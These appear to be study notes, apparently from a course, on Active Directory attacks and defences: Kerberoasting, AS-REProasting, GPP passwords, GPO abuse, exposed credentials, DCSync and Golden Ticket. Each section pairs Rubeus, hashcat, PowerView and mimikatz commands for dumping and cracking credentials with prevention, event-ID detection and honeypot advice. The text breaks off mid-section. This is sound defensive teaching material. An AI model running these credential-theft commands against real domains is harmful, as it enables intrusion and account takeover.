| search isOutlier=1

---

#### **Exemple 4 : Chargement rapide de nombreuses DLLs**

Une activité malveillante peut charger plusieurs DLLs en peu de temps. Cette requête identifie les processus impliqués :

spl
index="main" EventCode=7 
NOT (Image="C:\Windows\System32*") NOT (Image="C:\Program Files*")
| bucket _time span=1h
| stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image
| where unique_dlls_loaded > 3
| stats count by Image, unique_dlls_loaded
| sort - unique_dlls_loaded

---

#### **Exemple 5 : Exécutions multiples d’un même processus sur un hôte**

Des exécutions répétées peuvent trahir des activités suspectes :

spl
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) > 1
| stats count by Image, ParentImage

Pour cibler des cas particuliers, comme `rundll32.exe` exécuté par `svchost.exe` :

spl
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) > 1
| search Image="C:\Windows\System32\rundll32.exe" ParentImage="C:\Windows\System32\svchost.exe"
| table CommandLine, ParentCommandLine

```

## **Windows Attacks & Defense**

## Kerberoasting

```jsx

---

## 📌 **Kerberoasting dans Active Directory – Explication, Attaque, Prévention et Détection**

### 🔍 **Qu'est-ce qu'un SPN ?**

Un **Service Principal Name (SPN)** est un identifiant unique utilisé par Kerberos pour authentifier un service sans avoir besoin de connaître le nom de compte du service. Lorsqu’un ticket TGS (Ticket Granting Service) est demandé, il est chiffré avec le hash NTLM du compte de service.

---

### 🎯 **Kerberoasting : Principe de l’attaque**

**Kerberoasting** est une technique post-exploitation. Elle consiste à :

1. **Récupérer les tickets TGS** de services (associés aux SPNs).
2. **Les cracker hors ligne** afin de retrouver le mot de passe du compte de service.

L’attaque est d’autant plus efficace si :

* Le mot de passe du compte est faible.
* Le ticket utilise un algorithme de chiffrement vulnérable.

#### 🔐 Algorithmes de chiffrement utilisés :

* **AES** : très sécurisé, difficile à cracker.
* **RC4** : fréquemment vulnérable.
* **DES** : obsolète, rarement utilisé aujourd’hui.

Malgré les recommandations de sécurité, **RC4 et DES** sont encore présents dans certains environnements.

---

### 🧨 **Chemin d'attaque**

#### 1. **Extraction des tickets TGS**

Avec des outils comme **Rubeus**, un attaquant peut extraire les tickets Kerberos liés aux comptes SPN :

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt
```

> Les tickets sont enregistrés dans `spn.txt`.

#### 2. **Crackage des tickets**

Les hashes extraits sont ensuite transférés sur un outil comme **Hashcat** (Linux/Kali) pour tentative de bruteforce :

```bash
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
```

* `-m 13100` : mode Hashcat pour Kerberoasting.
* `passwords.txt` : dictionnaire de mots de passe.
* Résultat : les mots de passe de comptes de service sont révélés en clair.

```bash
cat cracked.txt
```

---

### 🛡️ **Prévention**

Pour contrer cette attaque :

* 🔒 **Mots de passe robustes** : longs et complexes (idéalement > 100 caractères).
* 🧹 **Limiter les comptes SPN** : supprimer les SPN inutilisés.
* 🔄 **Utiliser les GMSA** *(Group Managed Service Accounts)* : mots de passe gérés et renouvelés automatiquement.

---

### 🕵️‍♂️ **Détection**

Chaque demande de TGS génère un **événement Windows ID 4769**. Bien qu’il soit difficile de tout surveiller, certains comportements sont suspects :

* ❗ **Tickets RC4** : si l’environnement est censé utiliser uniquement AES, alerter sur tout ticket RC4.
* 📈 **Volume anormal de requêtes TGS** : surtout depuis un seul poste ou utilisateur.
* 🎣 **Comptes honeypot** : créer un faux compte avec un SPN, inactif mais attirant. Toute requête à ce compte est suspecte.

---

### 🎭 **Création d’un compte honeypot**

Critères pour un compte leurre efficace :

* 👤 **Ancien compte** : inactif depuis > 2 ans.
* 🔐 **Mot de passe incassable**.
* 🧾 **SPN réaliste** : lié à un service comme IIS ou SQL.

**Exemple** :

```text
Nom du compte : svc-iam
SPN attribué : HTTP/svc-iam.domain.local
```

---

### ⚠️ **Remarque importante**

Multiplier les honeypots peut rendre leur présence détectable. Il est donc crucial d’adapter ces techniques à votre environnement, en combinant sécurité et discrétion.

---

```

## AS-REProasting

```jsx

---

## 🔍 **AS-REPRoasting dans Active Directory – Description, Attaque, Prévention et Détection**

### 📌 **Qu'est-ce que l'AS-REPRoasting ?**

L'attaque **AS-REPRoasting** est similaire au Kerberoasting. Elle cible les comptes utilisateurs configurés sans pré-authentification Kerberos (option **"Do not require Kerberos preauthentication"**). Cette configuration permet aux attaquants de récupérer des **hashs Kerberos crackables** sans interaction avec le mot de passe du compte.

Le succès de l’attaque dépend principalement de la **robustesse du mot de passe** du compte ciblé.

---

### 🧨 **Étapes de l’attaque**

#### 1. **Extraction des hashs AS-REP**

À l’aide d’outils comme **Rubeus**, les attaquants extraient les hashs des comptes vulnérables :

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt
```

> Les hashs sont enregistrés dans le fichier `asrep.txt`.

#### 2. **Préparation du hash pour cracking**

Avant le bruteforce, le hash doit être formaté pour Hashcat. Il faut s’assurer que le hash commence par :

```
$krb5asrep$23$...
```

Exemple :

```
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c6480335...
```

#### 3. **Crackage avec Hashcat**

Utilisation de **Hashcat** en mode **18200**, spécialement conçu pour les hashs AS-REP :

```bash
sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```

#### 4. **Affichage des résultats**

Une fois le mot de passe trouvé, l’ouvrir en clair :

```bash
cat asrepcrack.txt
```

---

### 🛡️ **Prévention**

La sécurité repose principalement sur la **configuration des comptes** et la **politique de mot de passe**.

* 🔍 **Révision régulière** : Désactivez l’option *"no preauthentication"* sauf si elle est strictement nécessaire. Faites des audits trimestriels pour détecter toute mauvaise configuration.
* 🔒 **Politique de mot de passe renforcée** : Imposer une longueur minimale de 20 caractères pour les comptes sans pré-authentification.

---

### 🕵️‍♂️ **Détection**

Lorsqu’un **TGT** est demandé, l’**événement Windows ID 4768** est généré. Bien que courant, il est possible de détecter des comportements suspects en :

* 📍 **Corrélant les IP/VLAN** : Identifier les sources inhabituelles de requêtes.
* 📊 **Analyse comportementale** : Surveiller les requêtes fréquentes sur un même compte ou depuis des adresses inconnues.

---

### 🎣 **Déploiement d’un compte honeypot**

Un **compte honeypot** bien configuré peut attirer et identifier les attaques AS-REPRoasting. Il doit répondre à certains critères :

* 🕰️ **Ancien compte** : Inactif depuis longtemps, avec un mot de passe jamais changé.
* 👣 **Connexion récente** : Doit apparaître actif pour paraître légitime.
* 🛠️ **Privilèges assignés** : Assez de droits pour attirer l’attention des attaquants.
* ⚙️ **Pré-authentification désactivée** : Condition nécessaire pour l’attaque.

**Exemple** :

```
Nom du compte : svc-iam  
Configuration : privilèges élevés, pré-authentification Kerberos désactivée
```

---

### ⚠️ **Conseil de prudence**

Évitez de surutiliser les honeypots, au risque de créer des schémas détectables par les attaquants. Sélectionnez les méthodes de détection les plus adaptées à votre environnement pour équilibrer efficacité et discrétion.

---

```

## GPP Passwords

```jsx

---

## 🔐 **Exploitation des mots de passe GPP dans SYSVOL – Description, Attaque, Prévention et Détection**

### 📌 **Qu’est-ce que SYSVOL ?**

**SYSVOL** est un partage réseau présent sur tous les **Domain Controllers (DC)**, contenant :

* Scripts de connexion,
* Données de stratégies de groupe (GPO),
* Et d'autres fichiers essentiels à l’environnement Active Directory.

Les stratégies de groupe sont stockées ici :

```
\\<DOMAINE>\SYSVOL\<DOMAINE>\Policies\
```

Avec **Windows Server 2008**, les **Group Policy Preferences (GPP)** ont introduit la possibilité d’enregistrer des **identifiants** dans certains fichiers XML. Ces identifiants incluent un mot de passe chiffré avec une clé qui a été **rendue publique par Microsoft**, ce qui rend possible leur déchiffrement par tout utilisateur authentifié du domaine.

---

### 🎯 **Scénario d’attaque**

#### 1. **Extraction et déchiffrement des mots de passe GPP**

Grâce à des outils comme **PowerSploit**, un attaquant peut rechercher les fichiers XML contenant le champ **`cpassword`**, et les décrypter à l’aide de la clé publiée :

```powershell
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

**Exemple de résultat :**

```
UserName  : svc-iis  
Password  : abcd@123  
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml  
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80  
```

> Le mot de passe est visible en clair après déchiffrement.

---

### 🛡️ **Prévention**

* 🛠 **Mise à jour critique** : Microsoft a publié **KB2962486 (2014)** pour désactiver la possibilité d’enregistrer de nouveaux mots de passe dans les GPP.
  ⚠ **Attention** : cette mise à jour **ne supprime pas** les anciens mots de passe déjà présents.

* 🔍 **Audit régulier** : Dans les environnements mis en place avant 2014, il est impératif de vérifier que **plus aucun mot de passe n’est exposé** dans SYSVOL.

---

### 🕵️‍♂️ **Détection**

#### 1. **Surveillance des accès aux fichiers XML contenant `cpassword`**

* Activez l’audit sur les dossiers GPP contenant des fichiers sensibles.
* Chaque accès génère un **événement 4663**, utile pour identifier des lectures non légitimes.

#### 2. **Tentatives de connexion avec les identifiants exposés**

* Surveillez les connexions avec les comptes exposés, notamment :

  * **4624** – Connexion réussie
  * **4625** – Échec de connexion
  * **4768** – Requête de ticket Kerberos (TGT)

> Une connexion réussie depuis une machine inattendue est un **indicateur fort d’abus**.

---

### 🎣 **Déploiement d’un compte honeypot**

La mise en place d’un **faux compte de service** dans un fichier GPP peut piéger les attaquants.

#### Critères pour un compte honeypot efficace :

* 🔒 **Mot de passe invalide** : L’identifiant affiché est incorrect ou désuet.
* 🕰️ **Ancienneté apparente** : La date de dernier changement de mot de passe précède la dernière modification du fichier XML.
* 👣 **Simulation d’activité** : Une tâche planifiée bidon simule des connexions régulières.

> Toute tentative de connexion réelle à ce compte (en dehors du script simulé) déclenche une alerte.

#### Événements à surveiller :

* **4625** – Échec de connexion
* **4771** – Échec d’authentification Kerberos
* **4776** – Échec d’authentification NTLM

---

### ⚠️ **Remarque stratégique**

L’usage excessif de leurres trop évidents peut trahir vos mécanismes de détection. Adaptez vos honeypots avec réalisme et discrétion pour maximiser leur efficacité sans éveiller les soupçons.

---

```

## GPO Permissions/GPO Files

```jsx

---

## 🛠️ **Abus des GPO dans Active Directory – Description, Attaque, Prévention et Détection**

### 📌 **Qu’est-ce qu’un GPO ?**

Un **Group Policy Object (GPO)** est un ensemble de configurations appliquées à des objets Active Directory (utilisateurs, ordinateurs) via des **Unités d’Organisation (OU)**. Chaque GPO a un **nom unique** et peut être filtré par :

* Groupes de sécurité (ex. : Domain Users),
* Filtres WMI,
* OU spécifiques.

> Par défaut, seuls les **Domain Admins** et rôles privilégiés peuvent modifier un GPO. Mais des délégations spécifiques peuvent étendre ces droits à des utilisateurs moins privilégiés.

---

### 🎯 **Vecteurs d’attaque GPO**

Un attaquant ayant accès à un compte compromis **avec droits d’édition** sur un GPO peut :

* 🧾 **Ajouter des scripts de démarrage**, tâches planifiées ou logiciels malveillants.
* 🎯 **Cibler les objets** dans l’OU liée au GPO, compromettant ainsi plusieurs machines.

Un autre vecteur courant est l’exploitation de **partages réseau mal configurés** contenant des fichiers utilisés par des GPOs (ex. : scripts ou exécutables). Si les **droits NTFS** permettent l'écriture, l’attaquant peut **remplacer un fichier légitime par un fichier malveillant**, même si le GPO est intact.

---

### 🧨 **Exploitation des permissions GPO**

#### Attaque directe :

* Modifier un GPO vulnérable (permissions trop larges).
* Ajouter un script ou un exécutable malveillant.

#### Attaque indirecte :

* Identifier un GPO utilisant un fichier sur un **partage modifiable**.
* Remplacer ce fichier par une version malveillante.

---

### 🛡️ **Prévention**

✅ **Restreindre strictement les permissions GPO** :

* Limiter les droits de modification à une **liste de comptes de confiance**.

🔁 **Revue régulière des GPOs** :

* Mettre en place une **vérification horaire automatisée** des permissions GPO.
* Détecter tout écart par rapport aux configurations prévues.

📂 **Sécuriser les partages réseau** :

* Ne jamais utiliser de fichiers GPO hébergés sur des partages accessibles en écriture à plusieurs utilisateurs.

---

### 🕵️‍♂️ **Détection**

#### 🔍 **Modification d’un GPO**

Activez l’**audit des modifications d’annuaire** pour capturer l’événement suivant :

* **Event ID 5136** : signale une modification d’objet, y compris de GPO.

> Toute modification faite par un utilisateur non autorisé doit générer une alerte immédiate.

---

### 🎣 **Honeypot GPO**

Une stratégie avancée de détection consiste à créer un **GPO leurre** configuré pour attirer un attaquant.

#### ⚙️ **Conditions pour un honeypot GPO efficace :**

* Lié à des serveurs non critiques.
* Suivi **automatisé et en temps réel** des modifications.
* **Désactivation automatique** en cas de détection d'altération.

#### 🔄 **Script de détection automatique (PowerShell)**

Ce script PowerShell surveille un GPO honeypot spécifique et **désactive tout utilisateur l’ayant modifié** :

```powershell
# Période de surveillance : 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)

# Recherche des événements 5136 liés au GPO cible
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`
Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}

if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody += "Disabled user " + $log.Properties[3].Value + "`r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Envoi d’un e-mail d’alerte (à compléter avec Send-MailMessage)
    $emailBody
}
```

> Une désactivation déclenche **l'événement 4725**, indiquant qu’un compte a été désactivé.

---

### ⚠️ **Recommandations stratégiques**

Les honeypots GPO doivent être utilisés dans des **environnements matures**, dotés de capacités de détection et de réponse rapide. Mal utilisés, ils peuvent devenir évidents pour les attaquants.

---

```

## Credentials in Shares

```jsx
### **Exposition des Identifiants dans les Partages Réseau – Description, Attaque, Prévention et Détection**

#### **Contexte : Exposition des Identifiants sur les Partages Réseau**

L’exposition des **identifiants dans les partages réseau** est l’une des **mauvaise configuration les plus courantes** rencontrées dans Active Directory. Bien que ces erreurs surviennent fréquemment dans les grandes entreprises, elles peuvent aussi affecter des petites structures. Ce phénomène ressemble à une évolution de la problématique des mots de passe laissés sur des post-its, en passant à « ne laissez pas de **identifiants non chiffrés** et de **tokens d'autorisation** éparpillés sur le réseau ».

Les identifiants peuvent être trouvés dans des **scripts** et **fichiers de configuration** sur des partages réseau (ex. : scripts batch, cmd, PowerShell, fichiers ini et config). Par contraste, les identifiants stockés sur les machines locales des utilisateurs se trouvent souvent dans des **fichiers texte**, **Excel** ou **Word**. Toutefois, la différence majeure réside dans le fait que les **partages réseau** représentent un **risque beaucoup plus élevé** en raison de leur accessibilité potentielle pour **tous les utilisateurs**.

#### **Pourquoi les Partages Réseau sont-ils Exposés ?**

Il existe plusieurs raisons pour lesquelles un partage réseau devient accessible à tous :

1. **Accès trop large à un partage initialement sécurisé** :
   Un administrateur crée un partage avec des restrictions appropriées, mais d'autres administrateurs finissent par étendre l'accès à "Tout le monde" (groupe "Users"), donnant ainsi accès à tous les utilisateurs du domaine.

2. **Mauvaise gestion des partages de scripts** :
   Parfois, un administrateur crée un répertoire pour tester des scripts sur le \**C:\** ou dans un autre répertoire partagé, mais oublie de restreindre l’accès, exposant ainsi des informations sensibles.

3. **Partages ouverts par négligence** :
   Certains partages peuvent être laissés ouverts après une utilisation temporaire pour transférer des fichiers ou installer des logiciels, puis ne sont pas fermés après l’utilisation.

4. **Partages cachés mal compris** :
   Les partages cachés (nom de dossier se terminant par "\$") ne sont pas affichés dans l’**Explorateur Windows**. Cependant, d’autres outils (comme **PowerShell** ou **Command Prompt**) peuvent y accéder et y trouver des informations sensibles.

#### **Attaque**

L'attaque commence par l'identification des **partages réseau accessibles** au sein du domaine. Des outils comme **Invoke-ShareFinder** de **PowerView** permettent de lister tous les partages disponibles et de vérifier les accès en fonction des permissions de l'utilisateur.

**Exemple d’utilisation de PowerView :**

```powershell
PS C:\Users\bob\Downloads> Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
```

**Exemple de sortie :**

```plaintext
\\DC2.eagle.local\NETLOGON      - Logon server share
\\DC2.eagle.local\SYSVOL        - Logon server share
\\WS001.eagle.local\Share       -
\\WS001.eagle.local\Users       -
\\Server01.eagle.local\dev$     -
```

L'attaquant peut alors rechercher des **mots clés** comme "pass", "username", ou "password" dans les fichiers partagés à l’aide de la commande **findstr** (outil intégré dans Windows) :

**Commande PowerShell :**

```powershell
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.bat
```

#### **Prévention**

La meilleure façon de prévenir cette attaque est de **verrouiller l'accès à tous les partages réseau** dans le domaine. Il est essentiel d’effectuer des **analyses régulières** (hebdomadaires) pour détecter tout nouveau partage ouvert ou toute information sensible exposée dans un ancien partage.

1. **Limiter les permissions sur les partages** : Restreindre l'accès à **seulement les utilisateurs nécessaires**.
2. **Audits réguliers** : Planifier des scans fréquents des partages réseau pour vérifier leur sécurité.
3. **Utilisation de partages sécurisés** : Éviter d’utiliser des partages qui peuvent être modifiés par des utilisateurs non autorisés.

#### **Détection**

La détection d'une exploitation des identifiants exposés sur les partages se base sur l’analyse du comportement des utilisateurs et la surveillance des événements associés à l’utilisation des identifiants compromis.

**Événements clés à surveiller** :

* **Event ID 4624** : Connexion réussie (connexion avec des identifiants exposés).
* **Event ID 4768** : Requête de ticket TGT (Kerberos).

Analyser les connexions suspectes ou provenant de lieux inhabituels peut permettre de repérer une exploitation des identifiants.

#### **Honeypot**

Une stratégie efficace pour détecter l’exploitation des identifiants sur les partages consiste à créer un **compte honeypot** dans Active Directory.

**Configuration idéale pour un compte honeypot** :

* Un compte de service créé il y a **plus de 2 ans**, avec un mot de passe **non modifié depuis au moins un an**.
* Ce compte doit être encore **actif** dans l'environnement, mais la **mauvaise configuration de son mot de passe** entraînera principalement des tentatives de **connexion échouées**.

**Événements associés à un compte honeypot** :

* **4625** : Tentative de connexion échouée.
* **4771** : Échec de l'authentification Kerberos.
* **4776** : Échec de l'authentification NTLM.

Le suivi de ces tentatives peut alerter les administrateurs en cas de compromission des identifiants.

---

```

## Credentials in Object Properties

```jsx
### **Exposition des Identifiants dans les Propriétés des Objets Active Directory – Description, Attaque, Prévention et Détection**

#### **Contexte : Storing Credentials in Object Properties in Active Directory**

Dans **Active Directory**, chaque objet possède de nombreuses propriétés, telles que :

* L’état du compte (actif/inactif),
* La date d’expiration du compte,
* La date de la dernière modification du mot de passe,
* Le nom du compte,
* La localisation de l’employé, son numéro de téléphone, etc.

Les administrateurs remplissent ces propriétés lors de la création des comptes. Toutefois, une mauvaise pratique courante dans le passé était d’ajouter les **mots de passe** (ou d’autres informations sensibles) dans les propriétés **Description** ou **Info** des objets. Cette approche était souvent motivée par la croyance erronée que ces propriétés étaient sécurisées et réservées à une consultation uniquement par les administrateurs. Or, il est important de savoir que **tous les utilisateurs du domaine** peuvent lire la majorité des propriétés des objets, y compris **Description** et **Info**.

#### **Attaque**

Un attaquant peut facilement récupérer des mots de passe stockés dans ces propriétés en utilisant un script PowerShell simple qui interroge le domaine pour rechercher des termes spécifiques dans les propriétés **Description** ou **Info** des utilisateurs.

**Exemple de script PowerShell :**

```powershell
Function SearchUserClearTextInformation {
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms) {
        $list += "(`$_.Description -like `"*$t*`")"
        $list += "(`$_.Info -like `"*$t*`")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
```

Dans cet exemple, le script recherche le mot clé "pass" dans les propriétés **Description** et **Info** pour trouver les mots de passe en clair. Si un mot de passe est trouvé dans un champ, le script retourne les informations de l’utilisateur.

**Exemple d'exécution du script :**

```powershell
PS C:\Users\bob\Downloads> SearchUserClearTextInformation -Terms "pass"
SamAccountName       : bonni
Enabled              : True
Description          : pass: Slavi123
Info                 : 
PasswordNeverExpires : True
PasswordLastSet      : 05/12/2022 15.18.05
```

Ici, le mot de passe **Slavi123** est trouvé dans le champ **Description** de l'utilisateur **bonni**.

#### **Prévention**

Pour prévenir ce type de mauvaise configuration, voici quelques bonnes pratiques :

1. **Évaluations continues** : Effectuer des évaluations continues pour détecter l’éventuelle présence de mots de passe dans les propriétés des objets d’Active Directory.
2. **Formation des employés avec privilèges élevés** : Former les administrateurs et les utilisateurs privilégiés pour éviter de stocker des identifiants dans ces propriétés.
3. **Automatisation de la création des comptes utilisateurs** : Automatiser autant que possible la création des comptes utilisateurs pour éviter que les administrateurs saisissent manuellement des informations sensibles, comme des mots de passe, dans les propriétés des objets.

#### **Détection**

La détection de l'exploitation des informations sensibles dans les propriétés des objets peut être réalisée via l’analyse des **comportements des utilisateurs**. Cette méthode de détection est plus efficace pour les **comptes administratifs** ou **comptes de service**, dont le comportement peut être compris et surveillé.

Les **événements à surveiller** incluent :

* **Event ID 4624** : Connexion réussie, ce qui peut indiquer que les identifiants trouvés dans les propriétés des objets ont été utilisés.
* **Event ID 4625** : Tentative de connexion échouée, si l’attaquant tente d’utiliser les identifiants stockés en clair mais échoue.
* **Event ID 4768** : Requête Kerberos TGT, liée à l’utilisation des identifiants dans l’environnement Kerberos.

**Limite de la détection** : L’événement **Event ID 4738** (modification d’un objet utilisateur) ne permet pas d’identifier directement quelles propriétés ont été modifiées ou les nouvelles valeurs des propriétés. Cela rend difficile la détection d’ajouts de mots de passe dans ces champs par les administrateurs.

#### **Honeypot**

Stocker des mots de passe dans les propriétés des objets peut être une technique intéressante pour créer un **honeypot** dans un environnement Active Directory qui n’a pas encore atteint un niveau de maturité en termes de gestion des identifiants.

**Configuration du compte honeypot** :

1. Le mot de passe est stocké dans le champ **Description**, ce qui facilite sa découverte par un attaquant.
2. Le mot de passe fourni est **incorrect** (cela permet de détecter des tentatives de connexion échouées).
3. Le compte est **activé** et possède des **tentatives de connexion récentes**.
4. Idéalement, utilisez un **compte de service**, car les administrateurs ont tendance à les créer manuellement, contrairement aux comptes d’utilisateurs créés par des systèmes automatisés (comme le système RH).
5. Le mot de passe de ce compte a été défini **il y a plus de 2 ans**, ce qui le rend crédible aux yeux d'un attaquant.

En raison du mot de passe incorrect, vous pouvez vous attendre à voir des tentatives de connexion échouées, telles que :

* **Event ID 4625** : Échec de connexion.
* **Event ID 4771** : Échec de l’authentification Kerberos.
* **Event ID 4776** : Échec de la validation des identifiants NTLM.

```

## DCSync

```jsx
### **DCSync Attack in Active Directory**

#### **Description**

The **DCSync** attack allows attackers to **impersonate a Domain Controller (DC)** and perform replication with a targeted Domain Controller to extract **password hashes** from Active Directory (AD). This attack requires specific permissions, which are:

* **Replicating Directory Changes**
* **Replicating Directory Changes All**

These permissions enable the attacker to request password data from the AD environment, mimicking the behavior of a Domain Controller during replication.

The attack can be initiated by either a user or a computer, as long as the attacker has the necessary replication permissions assigned. This makes it a potent attack method for obtaining credential hashes from the AD environment, even without direct access to the domain controller itself.

#### **Attack Process**

Here is an example of how the DCSync attack works using **Mimikatz**, a popular tool for Windows post-exploitation:

##### **Step 1: Set Up the Attacker User Account**

First, the attacker needs to impersonate a user that has the **Replicating Directory Changes** and **Replicating Directory Changes All** permissions.

* In this example, the user **Rocky** has the required permissions.
* Rocky’s password is **Slavi123**.

##### **Step 2: Start a Command Shell as the Attacker User**

The attacker uses the **runas** command to launch a command shell as the user **Rocky**:

```powershell
C:\Users\bob\Downloads> runas /user:eagle\rocky cmd.exe
Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky"
```

##### **Step 3: Use Mimikatz to Perform DCSync**

Once in the command shell, the attacker uses **Mimikatz** to dump password hashes. The attacker targets the **Administrator** account in this case:

```powershell
C:\Mimikatz> mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
```

This command initiates the DCSync attack against the **Administrator** user in the **eagle.local** domain.

**Mimikatz Output Example:**

```plaintext
[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 07/08/2022 11.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
```

In this example, the **NTLM hash** for the **Administrator** account is extracted. The hash is then used for potential further attacks, like **pass-the-hash**.

##### **Optional: Dump All Hashes in AD**

Alternatively, the attacker can use the `/all` parameter to dump the hashes of all user accounts in the Active Directory environment:

```powershell
mimikatz # lsadump::dcsync /domain:eagle.local /all
```

This command would dump the NTLM hashes of every user in the domain, providing a broader attack surface for the attacker.

#### **Prevention**

Complete prevention of DCSync is challenging because the attack mimics standard replication operations within Active Directory. However, several mitigation measures can reduce the risk:

1. **Limit Replication Permissions**:

   * Restrict **Replicating Directory Changes** and **Replicating Directory Changes All** permissions to only trusted and necessary Domain Controllers.
   * **Remove unnecessary accounts** from these permissions, especially non-administrative or low-privileged accounts.

2. **Use a RPC Firewall**:

   * Implement a **RPC Firewall** to restrict replication requests to only trusted Domain Controllers. This can help block unauthorized replication attempts from non-DC systems.

3. **Use Managed Service Accounts (MSAs)**:

   * Use **Managed Service Accounts (MSAs)** instead of regular service accounts. MSAs reduce the need for manually managing credentials, which lowers the likelihood of exposing replication permissions to non-DC systems.

4. **Use Strong Authentication**:

   * Implement **strong authentication** mechanisms such as **multi-factor authentication (MFA)** for accounts that have replication privileges.

#### **Detection**

Detecting DCSync is possible by monitoring for specific events that are generated during the replication process. The following are important steps for detection:

1. **Monitor Event ID 4662**:

   * This event is generated whenever a replication attempt is made on a Domain Controller.
   * The event logs will contain information about the account initiating the replication and the object being replicated.

2. **Look for Replication Attempts**:

   * When an attacker uses DCSync, **Event ID 4662** will log details of the replication attempt.
   * Be on the lookout for unexpected replication requests from non-DC systems.

3. **Whitelist Trusted Systems**:

   * To reduce **false positives**, configure event monitoring systems to whitelist systems that legitimately need replication, such as **Azure AD Connect** or trusted **Domain Controllers**.

**Example of Event ID 4662 (Unauthorized DCSync Attempt):**

```plaintext
Event ID: 4662
Account Name: rocky
Object Name: DC2.eagle.local
Object Type: user
Access Mask: Replicate Directory Changes All
```

This event may indicate a **DCSync** attempt, particularly if the account initiating the replication is not authorized to perform this action.

#### **Conclusion**

The **DCSync attack** is a highly effective method for attackers to extract password hashes from Active Directory by impersonating a Domain Controller and performing replication. The attack relies on having the necessary **replication permissions** assigned to the attacker’s account, which may be inadvertently granted due to misconfigurations.

```

## Golden Ticket

```jsx
### **Kerberos Golden Ticket Attack**

#### **Description**

The **Kerberos Golden Ticket** is a highly impactful attack that allows attackers to create or forge valid Kerberos tickets (TGTs) for any user in the domain. By exploiting the **krbtgt** account (which is responsible for signing all Kerberos tickets in Active Directory), attackers can forge these tickets and impersonate any user, including privileged accounts like **Domain Admins**.

In a Kerberos authentication setup, the **krbtgt** account is critical because its password hash is used by the **Key Distribution Center (KDC)** to sign all Kerberos tickets. An attacker with access to the hash of this password can create valid Kerberos TGTs, enabling the attacker to authenticate as any user in the domain, including those with domain-wide privileges.

The **Golden Ticket attack** is typically performed after the attacker has gained **Domain Admin** or equivalent privileges, allowing them to generate a persistent, high-level foothold in the domain.

#### **Attack Overview**

1. **Targeting the krbtgt Account**:

   * The **krbtgt** account is automatically created when a domain is set up. Its password is used by the KDC to sign Kerberos tickets.
   * This account is **disabled** by default, but it cannot be deleted, renamed, or enabled.
   * Possession of the **krbtgt password hash** enables an attacker to generate legitimate Kerberos TGTs.

2. **Escalating Privileges**:

   * With the **Golden Ticket**, an attacker can impersonate any user in the domain, including users from other domains in the forest.
   * The attacker can escalate privileges from a **child domain** to a **parent domain**, giving them access to the entire forest.

3. **Persistent Access**:

   * The Golden Ticket provides **long-term persistence** in the domain, allowing the attacker to maintain access even after their original compromise is detected and remediated.

#### **Steps to Perform the Golden Ticket Attack**

**Step 1: Obtain the krbtgt Hash and SID**

The first step is to obtain the **krbtgt** password hash and the **domain SID**. This can be achieved using tools like **Mimikatz** and **DCSync**.

* Use **DCSync** to dump the **krbtgt** hash and domain SID:

```powershell
mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
```

**Mimikatz Output Example:**

```plaintext
SAM Username: krbtgt
Hash NTLM: db0d0630064747072a7da3f7c3b4069e
SID: S-1-5-21-1518138621-4282902758-752445584
```

The **krbtgt hash** (in this example: `db0d0630064747072a7da3f7c3b4069e`) is required for the Golden Ticket, as is the **domain SID** (`S-1-5-21-1518138621-4282902758-752445584`).

**Step 2: Generate the Golden Ticket**

Once the **krbtgt hash** and **domain SID** are obtained, the attacker can use **Mimikatz** to create a forged Kerberos Ticket Granting Ticket (TGT). The **kerberos::golden** command is used to generate the ticket.

Example command:

